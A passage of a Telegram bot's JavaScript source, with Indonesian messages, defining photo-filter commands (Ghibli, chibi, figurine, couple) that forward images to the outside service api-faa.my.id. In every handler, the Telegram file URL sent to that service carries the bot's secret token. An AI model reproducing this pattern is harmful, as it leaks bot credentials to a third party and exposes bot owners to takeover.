parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} else {
try {
const jsonData = JSON.parse(response.data.toString());
const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data || jsonData.data?.url || jsonData.data?.result;
if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
const imgResponse = await axios.get(imageUrlFromApi, { responseType: "arraybuffer" });
const imageBuffer = Buffer.from(imgResponse.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>🗾 Kamu sudah di Jepang!</blockquote>\n` +
`<i>Filter gaya Jepang berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} catch (jsonError) {
console.error('JSON parse error:', jsonError);
await bot.editMessageText(
`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
`<code>${escapeHTML(jsonError.message)}</code>`,
{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
);
}
}
} catch (error) {
console.error('Tojepang caption error:', error);
let errorMessage = '';
if (error.response?.status === 500) {
errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
} else if (error.message?.includes('timeout')) {
errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
} else {
errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
}
await bot.sendMessage(chatId, errorMessage, {
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
}
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🌿 TOGHIBLI COMMAND - AI GHIBLI STYLE FILTER
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/toghibli$/, async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const messageText = '/toghibli';
logUserInteraction(userId, username, chatType, messageText, groupName);
if (!msg.reply_to_message || !msg.reply_to_message.photo) {
return bot.sendMessage(chatId,
`<blockquote>❌ Format salah!</blockquote>\n` +
`<b>Reply foto dengan:</b> <code>/toghibli</code>\n\n` +
`<i>Balas foto yang ingin diubah jadi gaya Ghibli.</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
}
try {
const photo = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1];
const fileId = photo.file_id;
const processingMsg = await bot.sendMessage(chatId,
`<blockquote>🔄 Memproses foto...</blockquote>\n` +
`<i>Mengaplikasikan filter gaya Ghibli...</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
const file = await bot.getFile(fileId);
const filePath = file.file_path;
const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
const encodedUrl = encodeURIComponent(imageUrl);
const apiUrl = `https://api-faa.my.id/faa/toghibli?url=${encodedUrl}`;
const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
const contentType = response.headers["content-type"] || "";
if (contentType.startsWith("image/")) {
const imageBuffer = Buffer.from(response.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>🌿 Foto kamu jadi gaya Ghibli!</blockquote>\n` +
`<i>Filter gaya Ghibli berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} else {
try {
const jsonData = JSON.parse(response.data.toString());
const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data || jsonData.data?.url || jsonData.data?.result;
if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
const imgResponse = await axios.get(imageUrlFromApi, { responseType: "arraybuffer" });
const imageBuffer = Buffer.from(imgResponse.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>🌿 Foto kamu sudah jadi Ghibli!</blockquote>\n` +
`<i>Filter gaya Ghibli berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} catch (jsonError) {
console.error('JSON parse error:', jsonError);
await bot.editMessageText(
`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
`<code>${escapeHTML(jsonError.message)}</code>`,
{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
);
}
}
} catch (error) {
console.error('Toghibli error:', error);
let errorMessage = '';
if (error.response?.status === 500) {
errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
} else if (error.message?.includes('timeout')) {
errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
} else {
errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
}
try {
await bot.deleteMessage(chatId, processingMsg?.message_id || 0);
} catch (e) {}
await bot.sendMessage(chatId, errorMessage, {
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🌿 HANDLER UNTUK FOTO DENGAN CAPTION /TOGHIBLI
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.on('photo', async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
if (msg.caption && msg.caption.trim() === '/toghibli') {
const messageText = 'PHOTO_CAPTION: /toghibli';
logUserInteraction(userId, username, chatType, messageText, groupName);
try {
const fileId = msg.photo[msg.photo.length - 1].file_id;
const processingMsg = await bot.sendMessage(chatId,
`<blockquote>🔄 Memproses foto...</blockquote>\n` +
`<i>Mengaplikasikan filter gaya Ghibli...</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
const file = await bot.getFile(fileId);
const filePath = file.file_path;
const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
const encodedUrl = encodeURIComponent(imageUrl);
const apiUrl = `https://api-faa.my.id/faa/toghibli?url=${encodedUrl}`;
const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
const contentType = response.headers["content-type"] || "";
if (contentType.startsWith("image/")) {
const imageBuffer = Buffer.from(response.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>🌿 Foto kamu jadi gaya Ghibli!</blockquote>\n` +
`<i>Filter gaya Ghibli berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} else {
try {
const jsonData = JSON.parse(response.data.toString());
const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data || jsonData.data?.url || jsonData.data?.result;
if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
const imgResponse = await axios.get(imageUrlFromApi, { responseType: "arraybuffer" });
const imageBuffer = Buffer.from(imgResponse.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>🌿 Foto kamu sudah jadi Ghibli!</blockquote>\n` +
`<i>Filter gaya Ghibli berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} catch (jsonError) {
console.error('JSON parse error:', jsonError);
await bot.editMessageText(
`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
`<code>${escapeHTML(jsonError.message)}</code>`,
{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
);
}
}
} catch (error) {
console.error('Toghibli caption error:', error);
let errorMessage = '';
if (error.response?.status === 500) {
errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
} else if (error.message?.includes('timeout')) {
errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
} else {
errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
}
await bot.sendMessage(chatId, errorMessage, {
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
}
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🤖 TOFIGURE COMMAND - AI FIGURINE FILTER
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/tofigure$/, async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const messageText = '/tofigure';
logUserInteraction(userId, username, chatType, messageText, groupName);
if (!msg.reply_to_message || !msg.reply_to_message.photo) {
return bot.sendMessage(chatId,
`<blockquote>❌ Format salah!</blockquote>\n` +
`<b>Reply foto dengan:</b> <code>/tofigure</code>\n\n` +
`<i>Balas foto yang ingin diubah jadi figurine.</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
}
try {
const photo = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1];
const fileId = photo.file_id;
const processingMsg = await bot.sendMessage(chatId,
`<blockquote>🔄 Memproses foto...</blockquote>\n` +
`<i>Mengaplikasikan filter figurine AI...</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
const file = await bot.getFile(fileId);
const filePath = file.file_path;
const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
const encodedUrl = encodeURIComponent(imageUrl);
const apiUrl = `https://api-faa.my.id/faa/tofigura?url=${encodedUrl}`;
const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
const contentType = response.headers["content-type"] || "";
if (contentType.startsWith("image/")) {
const imageBuffer = Buffer.from(response.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>✅ Figurine jadi 😎</blockquote>\n` +
`<i>Filter figurine AI berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} else {
try {
const jsonData = JSON.parse(response.data.toString());
const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data || jsonData.data?.url || jsonData.data?.result;
if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
const imgResponse = await axios.get(imageUrlFromApi, { responseType: "arraybuffer" });
const imageBuffer = Buffer.from(imgResponse.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>✅ Figurine jadi 😎</blockquote>\n` +
`<i>Filter figurine AI berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} catch (jsonError) {
console.error('JSON parse error:', jsonError);
await bot.editMessageText(
`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
`<code>${escapeHTML(jsonError.message)}</code>`,
{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
);
}
}
} catch (error) {
console.error('Tofigure error:', error);
let errorMessage = '';
if (error.response?.status === 500) {
errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
} else if (error.message?.includes('timeout')) {
errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
} else {
errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
}
try {
await bot.deleteMessage(chatId, processingMsg?.message_id || 0);
} catch (e) {}
await bot.sendMessage(chatId, errorMessage, {
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🤖 HANDLER UNTUK FOTO DENGAN CAPTION /TOFIGURE
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.on('photo', async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
if (msg.caption && msg.caption.trim() === '/tofigure') {
const messageText = 'PHOTO_CAPTION: /tofigure';
logUserInteraction(userId, username, chatType, messageText, groupName);
try {
const fileId = msg.photo[msg.photo.length - 1].file_id;
const processingMsg = await bot.sendMessage(chatId,
`<blockquote>🔄 Memproses foto...</blockquote>\n` +
`<i>Mengaplikasikan filter figurine AI...</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
const file = await bot.getFile(fileId);
const filePath = file.file_path;
const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
const encodedUrl = encodeURIComponent(imageUrl);
const apiUrl = `https://api-faa.my.id/faa/tofigura?url=${encodedUrl}`;
const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
const contentType = response.headers["content-type"] || "";
if (contentType.startsWith("image/")) {
const imageBuffer = Buffer.from(response.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>✅ Figurine jadi 😎</blockquote>\n` +
`<i>Filter figurine AI berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} else {
try {
const jsonData = JSON.parse(response.data.toString());
const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data || jsonData.data?.url || jsonData.data?.result;
if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
const imgResponse = await axios.get(imageUrlFromApi, { responseType: "arraybuffer" });
const imageBuffer = Buffer.from(imgResponse.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>✅ Figurine jadi 😎</blockquote>\n` +
`<i>Filter figurine AI berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} catch (jsonError) {
console.error('JSON parse error:', jsonError);
await bot.editMessageText(
`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
`<code>${escapeHTML(jsonError.message)}</code>`,
{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
);
}
}
} catch (error) {
console.error('Tofigure caption error:', error);
let errorMessage = '';
if (error.response?.status === 500) {
errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
} else if (error.message?.includes('timeout')) {
errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
} else {
errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
}
await bot.sendMessage(chatId, errorMessage, {
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
}
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🍼 TOCHIBI COMMAND - AI CHIBI FILTER
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/tochibi$/, async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const messageText = '/tochibi';
logUserInteraction(userId, username, chatType, messageText, groupName);
if (!msg.reply_to_message || !msg.reply_to_message.photo) {
return bot.sendMessage(chatId,
`<blockquote>❌ Format salah!</blockquote>\n` +
`<b>Reply foto dengan:</b> <code>/tochibi</code>\n\n` +
`<i>Balas foto yang ingin diubah jadi chibi.</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
}
try {
const photo = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1];
const fileId = photo.file_id;
const processingMsg = await bot.sendMessage(chatId,
`<blockquote>🔄 Memproses foto...</blockquote>\n` +
`<i>Mengaplikasikan filter chibi AI...</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
const file = await bot.getFile(fileId);
const filePath = file.file_path;
const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
const encodedUrl = encodeURIComponent(imageUrl);
const apiUrl = `https://api-faa.my.id/faa/tochibi?url=${encodedUrl}`;
const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
const contentType = response.headers["content-type"] || "";
if (contentType.startsWith("image/")) {
const imageBuffer = Buffer.from(response.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>🍼 Foto kamu berhasil jadi chibi!</blockquote>\n` +
`<i>Filter chibi AI berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} else {
try {
const jsonData = JSON.parse(response.data.toString());
const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data || jsonData.data?.url || jsonData.data?.result;
if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
const imgResponse = await axios.get(imageUrlFromApi, { responseType: "arraybuffer" });
const imageBuffer = Buffer.from(imgResponse.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>🍼 Foto kamu jadi chibi imut!</blockquote>\n` +
`<i>Filter chibi AI berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} catch (jsonError) {
console.error('JSON parse error:', jsonError);
await bot.editMessageText(
`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
`<code>${escapeHTML(jsonError.message)}</code>`,
{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
);
}
}
} catch (error) {
console.error('Tochibi error:', error);
let errorMessage = '';
if (error.response?.status === 500) {
errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
} else if (error.message?.includes('timeout')) {
errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
} else {
errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
}
try {
await bot.deleteMessage(chatId, processingMsg?.message_id || 0);
} catch (e) {}
await bot.sendMessage(chatId, errorMessage, {
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🍼 HANDLER UNTUK FOTO DENGAN CAPTION /TOCHIBI
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.on('photo', async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
if (msg.caption && msg.caption.trim() === '/tochibi') {
const messageText = 'PHOTO_CAPTION: /tochibi';
logUserInteraction(userId, username, chatType, messageText, groupName);
try {
const fileId = msg.photo[msg.photo.length - 1].file_id;
const processingMsg = await bot.sendMessage(chatId,
`<blockquote>🔄 Memproses foto...</blockquote>\n` +
`<i>Mengaplikasikan filter chibi AI...</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
const file = await bot.getFile(fileId);
const filePath = file.file_path;
const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
const encodedUrl = encodeURIComponent(imageUrl);
const apiUrl = `https://api-faa.my.id/faa/tochibi?url=${encodedUrl}`;
const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
const contentType = response.headers["content-type"] || "";
if (contentType.startsWith("image/")) {
const imageBuffer = Buffer.from(response.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>🍼 Foto kamu berhasil jadi chibi!</blockquote>\n` +
`<i>Filter chibi AI berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} else {
try {
const jsonData = JSON.parse(response.data.toString());
const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data || jsonData.data?.url || jsonData.data?.result;
if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
const imgResponse = await axios.get(imageUrlFromApi, { responseType: "arraybuffer" });
const imageBuffer = Buffer.from(imgResponse.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>🍼 Foto kamu jadi chibi imut!</blockquote>\n` +
`<i>Filter chibi AI berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} catch (jsonError) {
console.error('JSON parse error:', jsonError);
await bot.editMessageText(
`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
`<code>${escapeHTML(jsonError.message)}</code>`,
{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
);
}
}
} catch (error) {
console.error('Tochibi caption error:', error);
let errorMessage = '';
if (error.response?.status === 500) {
errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
} else if (error.message?.includes('timeout')) {
errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
} else {
errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
}
await bot.sendMessage(chatId, errorMessage, {
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
}
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 💑 TOPACAR COMMAND - AI COUPLE FILTER
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/topacar$/, async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const messageText = '/topacar';
logUserInteraction(userId, username, chatType, messageText, groupName);
if (!msg.reply_to_message || !msg.reply_to_message.photo) {
return bot.sendMessage(chatId,
`<blockquote>❌ Format salah!</blockquote>\n` +
`<b>Reply foto dengan:</b> <code>/topacar</code>\n\n` +
`<i>Balas foto yang ingin ditambahkan pasangan.</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
}
try {
const photo = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1];
const fileId = photo.file_id;
const processingMsg = await bot.sendMessage(chatId,
`<blockquote>🔄 Memproses foto...</blockquote>\n` +
`<i>Mencari pasangan terbaik untukmu...</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
const file = await bot.getFile(fileId);
const filePath = file.file_path;
const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
const encodedUrl = encodeURIComponent(imageUrl);
const apiUrl = `https://api-faa.my.id/faa/topacar?url=${encodedUrl}`;
const response = await axios.get(apiUrl, { responseType: "arraybuffer" });
const contentType = response.headers["content-type"] || "";
if (contentType.startsWith("image/")) {
const imageBuffer = Buffer.from(response.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>💑 Kamu punya pacar baru!</blockquote>\n` +
`<i>Filter pasangan AI berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} else {
try {
const jsonData = JSON.parse(response.data.toString());
const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data || jsonData.data?.url;
if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
const imgResponse = await axios.get(imageUrlFromApi, { responseType: "arraybuffer" });
const imageBuffer = Buffer.from(imgResponse.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>💑 Kamu punya pacar baru!</blockquote>\n` +
`<i>Filter pasangan AI berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} catch (jsonError) {
console.error('JSON parse error:', jsonError);
await bot.editMessageText(
`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
`<code>${escapeHTML(jsonError.message)}</code>`,
{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
);
}
}
} catch (error) {
console.error('Topacar error:', error);
let errorMessage = '';
if (error.response?.status === 500) {
errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
} else if (error.message?.includes('timeout')) {
errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
} else {
errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
}
try {
await bot.deleteMessage(chatId, processingMsg?.message_id || 0);
} catch (e) {}
await bot.sendMessage(chatId, errorMessage, {
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 💑 HANDLER UNTUK FOTO DENGAN CAPTION /TOPACAR
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.on('photo', async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
if (msg.caption && msg.caption.trim() === '/topacar') {
const messageText = 'PHOTO_CAPTION: /topacar';
logUserInteraction(userId, username, chatType, messageText, groupName);
try {
const fileId = msg.photo[msg.photo.length - 1].file_id;
const processingMsg = await bot.sendMessage(chatId,
`<blockquote>🔄 Memproses foto...</blockquote>\n` +
`<i>Mencari pasangan terbaik untukmu...</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
const file = await bot.getFile(fileId);
const filePath = file.file_path;
const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
const encodedUrl = encodeURIComponent(imageUrl);
const apiUrl = `https://api-faa.my.id/faa/topacar?url=${encodedUrl}`;
const response = await axios.get(apiUrl, { responseType: "arraybuffer" });
const contentType = response.headers["content-type"] || "";
if (contentType.startsWith("image/")) {
const imageBuffer = Buffer.from(response.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>💑 Kamu punya pacar baru!</blockquote>\n` +
`<i>Filter pasangan AI berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} else {
try {
const jsonData = JSON.parse(response.data.toString());
const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data || jsonData.data?.url;
if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
const imgResponse = await axios.get(imageUrlFromApi, { responseType: "arraybuffer" });
const imageBuffer = Buffer.from(imgResponse.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>💑 Kamu punya pacar baru!</blockquote>\n` +
`<i>Filter pasangan AI berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} catch (jsonError) {
console.error('JSON parse error:', jsonError);
await bot.editMessageText(
`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
`<code>${escapeHTML(jsonError.message)}</code>`,
{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
);
}
}
} catch (error) {
console.error('Topacar caption error:', error);
let errorMessage = '';
if (error.response?.status === 500) {
errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
} else if (error.message?.includes('timeout')) {
errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
} else {
errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
}
await bot.sendMessage(chatId, errorMessage, {
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
}
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 👴 TOTUA COMMAND - AI AGING FILTER
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
